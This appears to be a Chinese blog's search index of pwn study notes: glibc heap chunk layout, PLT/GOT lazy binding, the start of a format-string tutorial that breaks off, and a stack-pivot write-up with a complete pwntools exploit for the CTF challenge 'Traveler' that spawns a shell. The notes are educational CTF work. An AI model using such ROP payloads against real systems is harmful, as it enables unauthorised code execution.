<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>堆相关数据结构</title>
    <link href="/2023/06/24/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    <url>/2023/06/24/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/</url>
    
    <content type="html"><![CDATA[<h1 id="堆相关数据结构"><a href="#堆相关数据结构" class="headerlink" title="堆相关数据结构"></a>堆相关数据结构</h1><h2 id="malloc-chunk"><a href="#malloc-chunk" class="headerlink" title="malloc_chunk"></a>malloc_chunk</h2><p>在程序的执行的过程中，由malloc申请的内存为chunk。内存在ptmalloc内部用malloc_hook结构体来表示。当申请的chunk</p><p>被free后，根据size大小会被加入到相应的空闲管理列表中。</p><p>无论一个chunk大小如何 ，处于分配状态还是释放状态，它们都使用一个统一的的结构。</p><h3 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">  This struct declaration is misleading (but accurate and necessary).</span><br><span class="hljs-comment">  It declares a &quot;view&quot; into memory allowing access to necessary</span><br><span class="hljs-comment">  fields at known offsets from a given base. See explanation below.</span><br><span class="hljs-comment">*/</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span> &#123;</span><br><br>  INTERNAL_SIZE_T      prev_size;  <span class="hljs-comment">/* Size of previous chunk (if free).  */</span><br>  INTERNAL_SIZE_T      size;       <span class="hljs-comment">/* Size in bytes, including overhead. */</span><br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">fd</span>;</span>         <span class="hljs-comment">/* double links -- used only if free. */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">bk</span>;</span><br><br>  <span class="hljs-comment">/* Only used for large blocks: pointer to next larger size.  */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">fd_nextsize</span>;</span> <span class="hljs-comment">/* double links -- used only if free. */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">bk_nextsize</span>;</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>解释：</p><ol><li><p>prev_size，如果该chunk物理相邻的前一地址chunk是空闲的，那么该字段记录的是前一个chunk的大小（包括chunk头）。否则，该字段用来储存物理相邻的前一个chunk的数据。</p></li><li><p>size，chunk的大小，大小必须是2*SIZE_SZ的整数倍。</p></li><li><p>fd，bk。chunk处于分配状态时，从fd字段开始是用户的数据。chunk空闲时，会被添加到对应的空闲管理链表中，此时，fd和bk才有效，fd指向下一个（非物理相邻）空闲的chunk；bk指向上一个（非物理相邻）空闲的chunk。</p></li><li><p>fd_nextsize，bk_nextsize，也是只有chunk空闲的时候才使用，用于较大的chunk（large chunk），fd_nextsize指向前一个与当前chunk大小不同的第一个空闲块，不包含bin指针；bk_nextsize指向后一个与当前chunk大小不同的第一个空闲块，不包含bin指针。</p><p>注意：32位系统中，SIZE_SZ是4，64位系统中，SIZE_SZ是8。故size字段低三位对chunk的大小没有影响，他们从高到低分别表示：</p><ol><li>NON_MAIN_ARENA，记录当前chunk是否不属于主线程，1表示不属于，0表示属于。</li><li>IS_MAPPED，记录当前chunk是否由mmap分配。</li><li>PREV_INUSE，记录前一个chunk块是否被分配。一般来说，堆中第一个被分配的内存块的size字段的P位都会被设置为1，以便防止访问前面的非法内存。当一个chunk的size的P位设置为0时，我们能通过prev_size字段来获取上一个chunk的大小以及地址。这也方便进行空闲chunk之间的合并。</li></ol></li></ol><h3 id="示意图"><a href="#示意图" class="headerlink" title="示意图"></a>示意图</h3><p> 分配的chunk：</p><p><img src="https://cdn.staticaly.com/gh/Xkeo-Blog/pic_bed@main/1.png" alt="1"></p><p>注：mem表示用户的指针</p><p>空闲的chunk：</p><p><img src="https://cdn.staticaly.com/gh/Xkeo-Blog/pic_bed@main/2.png" alt="2"></p><h2 id="bin"><a href="#bin" class="headerlink" title="bin"></a>bin</h2><p>后续写</p>]]></content>
    
    
    <categories>
      
      <category>pwn学习笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>栈迁移</title>
    <link href="/2023/04/30/%E6%A0%88%E8%BF%81%E7%A7%BB/"/>
    <url>/2023/04/30/%E6%A0%88%E8%BF%81%E7%A7%BB/</url>
    
    <content type="html"><![CDATA[<h1 id="栈迁移"><a href="#栈迁移" class="headerlink" title="栈迁移"></a>栈迁移</h1><h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>​    当程序出现栈溢出但是溢出长度不足以容纳ROP链且通常仅能覆盖EBP和RET地址时，我们就需要采用栈迁移。因为原来的栈空间不足，所以我们要找到一个新的栈空间放我们的ROP链并控制EBP，ESP，EIP去执行，因此被称为栈迁移。</p><h2 id="二、原理"><a href="#二、原理" class="headerlink" title="二、原理"></a>二、原理</h2><p>​    首先，栈执行命令是从esp开始向ebp方向逐条执行，也就是从底地址向高地址逐条执行。正常情况下退栈时，esp会指向ebp所在的位置，ebp则会回到原来ebp的位置（leave ret），相当于mov esp ebp;pop ebp;ret。pop ebp后esp会自动向上走一个地址，而ret等价于pop eip，就是将esp所对应的指令赋给eip，如下图：</p><p><img src="https://cdn.staticaly.com/gh/Xkeo-Blog/pic_bed@main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-04-30%20144542.png" alt=""></p><pre><code class="hljs">                            注：ESP在低地址，EBP在高地址</code></pre><p>​    那我们要怎么利用这个机制去劫持程序呢？由上面的图可以看出，退栈后，EBP指向了Original EBP的地方，也就是说我们可以利用栈溢出将EBP劫持到另一段栈空间内，然后利用leave_ret指令，通俗地讲，就是把Original EBP覆盖成我们写有ROP链的地址，RET address覆盖成leave_ret的地址，通过直接控制EBP的方式来达到间接控制ESP进而控制EIP，执行我们的ROP链。</p><p>​    个人觉得在做题的时候，最后一次栈迁移后EBP已经不知道在什么地方了，感觉EBP在什么地方无所谓，只要能够成功控制到ESP那么，程序就能正常执行我们的ROP，拿到shell。</p><h2 id="三、应用"><a href="#三、应用" class="headerlink" title="三、应用"></a>三、应用</h2><h3 id="VNCTF2023-Traveler"><a href="#VNCTF2023-Traveler" class="headerlink" title="VNCTF2023 Traveler"></a>VNCTF2023 Traveler</h3><h4 id="1-确定保护"><a href="#1-确定保护" class="headerlink" title="1.确定保护"></a>1.确定保护</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">RELRO           STACK CANARY      NX            PIE          RPATH      RUNPATH    Symbols   FORTIFYFortified  FortifiableFILE<br>Partial RELRO   No canary found   NX enabled    No PIE       No RPATH   No RUNPATH   <span class="hljs-number">72</span> Symbols  No    <span class="hljs-number">0</span>  <span class="hljs-number">1</span>  traveler<br></code></pre></td></tr></table></figure><h4 id="2-分析程序"><a href="#2-分析程序" class="headerlink" title="2.分析程序"></a>2.分析程序</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">32</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-20h] BYREF</span><br><br>  init(argc, argv, envp);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;who r u?&quot;</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x30</span>uLL); <span class="hljs-comment">//可溢出0x10个字节 仅能覆盖到EBP，EIP</span><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;How many travels can a person have in his life?&quot;</span>);<br>  read(<span class="hljs-number">0</span>, &amp;msg, <span class="hljs-number">0x28</span>uLL); <span class="hljs-comment">//bss段</span><br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/Xkeo-Blog/pic_bed@main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-04-30%20153053.png" alt=""></p><p><img src="https://cdn.staticaly.com/gh/Xkeo-Blog/pic_bed@main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-04-30%20153315.png" alt=""></p><h4 id="3-攻击思路"><a href="#3-攻击思路" class="headerlink" title="3.攻击思路"></a>3.攻击思路</h4><p>首先，第一次输入将ebp改到bss2+0x20处（因为程序段有read函数，直接利用程序本身的程序段）。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">bss1 = <span class="hljs-number">0x4040A0</span><br>bss2 = <span class="hljs-number">0x404d00</span> <br>pop_rdi = <span class="hljs-number">0x4012c3</span><br>leave_ret = <span class="hljs-number">0x401253</span><br>text_read = <span class="hljs-number">0x401216</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span> + p64(bss2+<span class="hljs-number">0x20</span>) + p64(text_read) <br>p.sendafter(<span class="hljs-string">b&#x27;u?\n&#x27;</span>, payload)<br><br><span class="hljs-comment">#下面这个没有太大价值，只是因为有这个流程</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x28</span><br>p.sendafter(<span class="hljs-string">b&#x27;e?\n&#x27;</span>, payload)<br></code></pre></td></tr></table></figure><p>那么为什么是bss2加0x20？见下图。</p><p><img src="https://cdn.staticaly.com/gh/Xkeo-Blog/pic_bed@main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-04-30%20182615.png" alt=""></p><p>可以看到在text_read执行时，会把rbp的地址减0x20，而rbp又是我们想要写入rop链的空间，因此我们要在填入位置时多加0x20。</p><p>接着，在bss2段写入我们的rop链</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = p64(pop_rdi) + p64(bss1) + p64(e.plt[<span class="hljs-string">&#x27;system&#x27;</span>]) + p64(<span class="hljs-number">0</span>) + p64(bss2 - <span class="hljs-number">0x08</span>) + p64(leave_ret) <span class="hljs-comment"># rop链</span><br>p.send(payload)<br>p.sendafter(<span class="hljs-string">b&#x27;e?\n&#x27;</span>, <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<span class="hljs-comment"># 参数写在bss1里，因为程序固定了这个空间，动不了（当然，这样也挺方便的）</span><br></code></pre></td></tr></table></figure><p>为什么要在bss2里写rop链，而不直接写在bss1呢？</p><p>因为msg的位置在.bss段的开头，如果我们直接在里面写rop链，rsp会滑进.got里，那么程序会出现段错误，所以我们选择在更高的位置写入。</p><p>那么要怎么写进去呢？</p><p>程序本身提供了一个read函数，可以将其利用，我们的rop就可以自然而然地写进去，而不必使用for循环一直滑到高位置；且该段自带leave_ret，因此我们也不必在其后添加leave_ret的地址。</p><p><img src="https://cdn.staticaly.com/gh/Xkeo-Blog/pic_bed@main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-04-30%20184207.png" alt=""></p><h4 id="4-exp"><a href="#4-exp" class="headerlink" title="4.exp"></a>4.exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>, os = <span class="hljs-string">&#x27;linux&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>e = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(p)<br>    pause()<br><br>bss1 = <span class="hljs-number">0x4040A0</span><br>bss2 = <span class="hljs-number">0x404d00</span><br>pop_rdi = <span class="hljs-number">0x4012c3</span><br>leave_ret = <span class="hljs-number">0x401253</span><br>text_read = <span class="hljs-number">0x401216</span><br><br><span class="hljs-comment">#debug()</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span> + p64(bss2+<span class="hljs-number">0x20</span>) + p64(text_read) <br>p.sendafter(<span class="hljs-string">b&#x27;u?\n&#x27;</span>, payload)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x28</span><br>p.sendafter(<span class="hljs-string">b&#x27;e?\n&#x27;</span>, payload)<br><br><span class="hljs-comment">#debug()</span><br>payload = p64(pop_rdi) + p64(bss1) + p64(e.plt[<span class="hljs-string">&#x27;system&#x27;</span>]) + p64(<span class="hljs-number">0</span>) + p64(bss2 - <span class="hljs-number">0x08</span>) + p64(leave_ret)<br>p.send(payload)<br>p.sendafter(<span class="hljs-string">b&#x27;e?\n&#x27;</span>, <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>pwn学习笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PLT表andGOT表以及延迟绑定机制</title>
    <link href="/2023/04/20/PLT%E8%A1%A8&amp;GOT%E8%A1%A8%E4%BB%A5%E5%8F%8A%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E6%9C%BA%E5%88%B6/"/>
    <url>/2023/04/20/PLT%E8%A1%A8&amp;GOT%E8%A1%A8%E4%BB%A5%E5%8F%8A%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E6%9C%BA%E5%88%B6/</url>
    
    <content type="html"><![CDATA[<h1 id="PLT-amp-GOT表以及延迟绑定机制"><a href="#PLT-amp-GOT表以及延迟绑定机制" class="headerlink" title="PLT&amp;GOT表以及延迟绑定机制"></a>PLT&amp;GOT表以及延迟绑定机制</h1><h2 id="一、ELF简述"><a href="#一、ELF简述" class="headerlink" title="一、ELF简述"></a>一、ELF简述</h2><p>​    ELF文件（The Executable and Linking Format）是linux环境中的一种二进制可执行文件；elf的基本信息存在于ELF header(ELF头部信息)，其中包括程序运行架构（32位/64位），大端序/小端序存储，ELF文件大小等等，可以通过<strong>readelf -h <elf_name></strong>来查看头部信息；elf可以包含很多<strong>节(section)</strong>，节都记录在一张称为“节头表”的数组中，具体可用<strong>readelf -S <elf_name></strong>查看，主要包括：</p><div class="table-container"><table><thead><tr><th style="text-align:center">名称</th><th style="text-align:center">作用</th></tr></thead><tbody><tr><td style="text-align:center">.text</td><td style="text-align:center">存放程序运行时的代码</td></tr><tr><td style="text-align:center">.rodata</td><td style="text-align:center">存放一些如字符串等不可被修改的数据</td></tr><tr><td style="text-align:center">.data</td><td style="text-align:center">存放已经初始化的可修改的数据</td></tr><tr><td style="text-align:center">.bss</td><td style="text-align:center">存放未被初始化的可修改的数据</td></tr><tr><td style="text-align:center">.plt与.got</td><td style="text-align:center">存放程序动态链接函数地址</td></tr></tbody></table></div><p>​    elf在加载到内存时，elf文件中的节会被映射未程序中的<strong>段（segment）</strong>，映射的机制是根据<strong>各个节的权限</strong>来进行映射的。例如，只读的节被映射到一个段，可读可写的节被映射到另外一个段。</p><p>如图所示：</p><p><img src="https://pic.imgdb.cn/item/6440d76a0d2dde577751f1de.png" alt=""></p><h2 id="二、静态编译与动态编译"><a href="#二、静态编译与动态编译" class="headerlink" title="二、静态编译与动态编译"></a>二、静态编译与动态编译</h2><p>​    动态链接库：存放系统函数的库文件。    </p><p>​    一个程序在运行的过程中会调用各种各样的函数；其中，一些函数我们并没有实现，而是调用的库函数。那么我们就需要在编译的时候做一定的操作——静态编译或动态编译，以利用我们想要的库函数。</p><p>​    静态编译会把可能用到的库函数全部编译进可执行文件中。在程序运行过程中不会依赖动态链接库，因为没有寻找库函数这一步，运行速度相对快些；但是同样这也是它的缺点，编译时间长，程序占用内存大。</p><p>​    动态编译则与静态编译相反，在运行时，当它遇到系统函数时，再去动态链接库中寻找——PLT&amp;GOT表。优点是减少了函数占用的内存，加快了编译的速度；但缺点是及其依赖动态链接库，可能在本地能运行，到了另外的一个环境，由于动态链接库版本差异，导致无法运行。</p><h2 id="三、延迟绑定机制"><a href="#三、延迟绑定机制" class="headerlink" title="三、延迟绑定机制"></a>三、延迟绑定机制</h2><h3 id="PLT-amp-GOT表"><a href="#PLT-amp-GOT表" class="headerlink" title="PLT&amp;GOT表"></a>PLT&amp;GOT表</h3><p>​    <strong>PLT（Procedure Linkage Table，程序链接表）</strong>是Linux ELF文件中用于延迟绑定的表。无论是第几次调用外部函数，程序真正调用的其实是PLT表。PLT表其实是由一段段汇编指令构成的，位于code段。</p><p>​    <strong>GOT（Global Offset Table，全局偏移表）</strong>是数据段用于地址无关码的Linux ELF文件中确定全局变量和外部函数地址的表。ELF中有.got和.got.plt两个GOT表。.got表用于全局变量的引用地址，.got.plt用于保存函数引用的地址，位于data段。</p><p>可执行文件里面保存的是 PLT 表的地址，对应 PLT 地址指向的是 GOT 的地址，GOT 表指向的就是 glibc 中的地址</p><p>如图：</p><p><img src="https://pic.imgdb.cn/item/6440eb630d2dde5777704379.jpg" alt=""></p><p>​    上述过程能够成功执行的前提是plt表中存放的got表里存放着正确的函数地址，但是如果程序在第一次执行时，就对所有函数进行重定位是很麻烦的。因此，linux引入延迟绑定机制。</p><h3 id="延迟绑定"><a href="#延迟绑定" class="headerlink" title="延迟绑定"></a>延迟绑定</h3><p>​    只有动态库函数被调用时，才会地址解析和重定位工作，为此我们可以使用类似这样的代码来实现：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//一开始没有重定位的时候将 printf@got 填成 lookup_printf 的地址</span><br><span class="hljs-type">void</span> <span class="hljs-built_in">printf</span>@plt()<br>&#123;<br>address_good:<br>    jmp *<span class="hljs-built_in">printf</span>@got   <br>lookup_printf:<br>    调用重定位函数查找 <span class="hljs-built_in">printf</span> 地址，并写到 <span class="hljs-built_in">printf</span>@got<br><span class="hljs-keyword">goto</span> address_good;<span class="hljs-comment">//再返回去执行address_good</span><br>&#125;<br></code></pre></td></tr></table></figure><p>​    解释：当第一次执行函数时，printf@got是lookup_printf的地址，lookup_printf用来寻找printf（）函数的地址，然后写入printf@got表中，它执行完后会返回address_good，再次jmp时，就会直接跳转到printf（）函数执行。</p><p>​    整个逻辑其实并不难理解，现在我们有了一个新的问题——lookup_printf是怎么找到printf（）函数正确的地址的？</p><p>​    写个程序来找找答案：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hello pwn!\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>​    gdb调试一下，当函数调用printf()时，发生了什么</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">0x401040</span>       &lt;<span class="hljs-built_in">printf</span>@plt&gt;                      endbr64 <br><span class="hljs-number">0x401044</span>       &lt;<span class="hljs-built_in">printf</span>@plt+<span class="hljs-number">4</span>&gt;                    bnd jmp qword ptr [rip + <span class="hljs-number">0x2fb5</span>]     &lt;<span class="hljs-number">0x401030</span>&gt; <span class="hljs-comment">//去lookup_printf的地址</span><br></code></pre></td></tr></table></figure><p>​    接着</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">0x401034</span>                                         push   <span class="hljs-number">0</span> <span class="hljs-comment">//压入一个参数</span><br><span class="hljs-number">0x401039</span>                                         bnd jmp <span class="hljs-number">0x401020</span>                     &lt;<span class="hljs-number">0x401020</span>&gt;<span class="hljs-comment">//去下一个表项</span><br></code></pre></td></tr></table></figure><p>​    接下来继续</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">0x401020</span>                                         push   qword ptr [rip + <span class="hljs-number">0x2fca</span>]      &lt;_GLOBAL_OFFSET_TABLE_+<span class="hljs-number">8</span>&gt; <span class="hljs-comment">//压入另一个参数</span><br><span class="hljs-number">0x401026</span>                                         bnd jmp qword ptr [rip + <span class="hljs-number">0x2fcb</span>]     &lt;_dl_runtime_resolve_xsavec&gt;<span class="hljs-comment">//跳去执行dl_resolve函数</span><br></code></pre></td></tr></table></figure><p>​    总结一下，按照上述描述，寻址过程：xxx@plt -&gt; xxx@got -&gt; xxx@plt -&gt; 公共 @got-&gt; _dl_runtime_resolve</p><p>​    到这里，我们还需要知道_dl_runtime_resolve是怎么找到printf()的，以及找到之后，它怎么知道填回哪个GOT表呢？</p><p>​    其实，观察前面的汇编代码，我们可以看到在跳转之前，都会压入一个参数，而每个需要寻找的函数压入的参数是不一样的，这就相当于函数的“身份证”，直接告诉_dl_runtime_resolve要找什么函数。</p><p>​    在 elf 文件中 .rel.plt 保存了重定位表的信息，使用 <code>readelf -r test</code> 命令可以查看 test 可执行文件中的重定位信息，当_dl_runtime_resolve找到函数之后，看 .rel.plt 的位置就对应着 xxx@plt 里 jmp 的地址，根据大佬博客说 plt 中 push 的操作数，就是对应函数在.rel.plt 段的偏移量。</p><p><img src="https://pic.imgdb.cn/item/6440f7560d2dde5777802dc2.png" alt=""></p><p>​    补充：</p><p>​        除了每个函数占用一个 GOT 表项外，GOT 表项还保留了３个公共表项，也即 got 的前３项，分别保存：</p><p>​        <strong>got [0]: 本 ELF 动态段 (.dynamic 段）的装载地址</strong> </p><p>​        <strong>got [1]：本 ELF 的 link_map 数据结构描述符地址</strong> </p><p>​        <strong>got [2]：_dl_runtime_resolve 函数的地址</strong></p><p>​        动态链接器在加载完 ELF 之后，都会将这３地址写到 GOT 表的前３项</p><p><strong>在网上找了张大佬画的流程图：</strong></p><p>​    第一次执行：</p><p><img src="https://pic.imgdb.cn/item/6440f8b00d2dde5777822fdd.jpg" alt=""></p><p>之后再次调用：</p><p><img src="https://pic.imgdb.cn/item/6440f8d70d2dde5777826d34.jpg" alt=""></p><h2 id="感悟（纯自己发电，可忽略（如果有人看的话））"><a href="#感悟（纯自己发电，可忽略（如果有人看的话））" class="headerlink" title="感悟（纯自己发电，可忽略（如果有人看的话））"></a>感悟（纯自己发电，可忽略（如果有人看的话））</h2><p>​    如果上述观点有任何问题，还望各位大佬指正。</p><p>​    感觉PLT&amp;GOT说难也不难，但平时做题的时候，总是感觉逻辑不通，所以写这篇博客，上述流程图都是网上大佬（本来想给大佬留个名，结果他也是偷别人的，那就套娃呗，哈哈哈哈哈）做的，确实本人没那个水平。</p>]]></content>
    
    
    <categories>
      
      <category>pwn学习笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>格式化字符串漏洞</title>
    <link href="/2023/04/08/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/"/>
    <url>/2023/04/08/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="格式化字符串漏洞"><a href="#格式化字符串漏洞" class="headerlink" title="格式化字符串漏洞"></a>格式化字符串漏洞</h1><p>​        格式化字符串漏洞是一种常见且危害比较大的漏洞，漏洞原因主要是因为类似于printf(str)这类语句，str可以由用户自己书写，如果用户通过写入设计好的语句，就会对程序里的东西进行泄露与更改，轻则使程序崩溃，重则可能会获取到shell，导致机器被人控制。</p><hr><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>​        printf函数第一个参数是字符串，被称为格式化字符串，在该字符串中可能含有%d，%s，%c等占位符，printf函数会根据这些占位符将占位符对应的位置里的内容与字符串链接起来整合成一个完整的字符串并输出。</p><p>​        例如：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">char</span> demo = <span class="hljs-string">&#x27;a&#x27;</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;the char is %c\n&quot;</span>, demo);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>​        此时，在printf函数执行时，它会将%c的值替换位a并输出，最终会输出：the char is a。</p><p>​        但如果我们不给printf函数传入demo，它是否会输出呢？答案是肯定的，前面我们说了printf会将占位符对应位置的内容拿出来，所以是否你有没有给参数，它都会到站上或者寄存器中取出数据。</p><p>​            不妨来看看这段代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">char</span> demo = <span class="hljs-string">&#x27;a&#x27;</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;the output is %p\n&quot;</span>); <span class="hljs-comment">//%p,以地址格式打印</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>​        gdb调试界面：</p><p><img src="https://pic.imgdb.cn/item/64316d410d2dde5777d758a4.png" alt=""></p><p>​        RDI中存放格式化字符串，RSI存放第二个参数对应%p，因此打印时%p替换为RSI的内容即0x7fffffffdfb8。</p><p>​        按前面的解释，printf会把%p替换为%p说对应的地址的内容，最终打印为：the output is 0x7fffffffdfb8。如我们所看到的，即便我们呢没给任何参数，printf函数依然把占位符对应的内容给打印出来了，这就很容易造成栈上的信息泄露，攻击者就可以利用该漏洞获取信息甚至是控制我们的程序。</p><p>​        